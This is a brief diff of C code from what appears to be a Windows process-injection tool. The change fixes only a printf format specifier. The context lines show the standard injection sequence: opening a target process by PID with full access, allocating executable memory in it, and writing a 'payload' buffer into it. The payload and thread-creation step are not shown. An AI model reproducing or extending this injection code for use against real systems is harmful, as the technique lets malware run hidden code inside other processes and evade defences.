@@ -8,7 +8,7 @@ int main(int argc, char *argv[]) {
   HANDLE remoteThread;
   PVOID remoteBuffer;
 
-  printf("Injecting to PID process: %1", atoi(argv[1]));
+  printf("Injecting to PID process: %i", atoi(argv[1]));
   processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
   remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof payload,(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
   WriteProcessMemory(processHandle, remoteBuffer, payload, sizeof payload, NULL);
